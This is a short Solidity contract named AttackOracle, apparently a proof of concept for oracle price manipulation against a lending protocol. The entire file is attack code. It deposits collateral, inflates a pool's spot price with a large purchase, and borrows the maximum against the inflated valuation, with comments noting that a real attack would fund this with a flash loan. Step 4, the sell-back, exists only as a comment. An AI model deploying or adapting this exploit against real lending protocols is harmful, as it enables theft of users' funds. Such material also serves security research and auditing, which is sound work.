// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

interface IPool {
    function getPrice() external view returns (uint256);

    function buyETH(uint256 usdIn) external returns (uint256);

    function sellETH(uint256 ethIn) external returns (uint256);
}

interface ILending {
    function depositCollateral() external payable;
    function borrow(uint256 usdAmount) external;
    function getMaxBorrow(address user) external view returns (uint256);
}

contract AttackOracle {
    IPool public pool;
    ILending public lending;
    address public owner;

    constructor(address _pool, address _lending) {
        pool = IPool(_pool);
        lending = ILending(_lending);
        owner = msg.sender;
    }

    function attack() external payable {
        // Step 1: deposit real collateral (1 ETH at real price = 3000 USD)
        lending.depositCollateral{value: 1 ether}();

        // Step 2: pump the price by buying ETH with large USD amount
        // In a real attack this would be a flash loan
        pool.buyETH(500_000 ether); // inject 500k USD -> price spikes

        // Step 3: borrow using inflated price as if collateral is worth more
        uint256 maxBorrow = lending.getMaxBorrow(address(this));
        lending.borrow(maxBorrow);

        // Step 4: sell ETH back - price returns to normal
        // In a real attack: repay flash loan here
    }

    function getPoolPrice() public view returns (uint256) {
        return pool.getPrice();
    }
}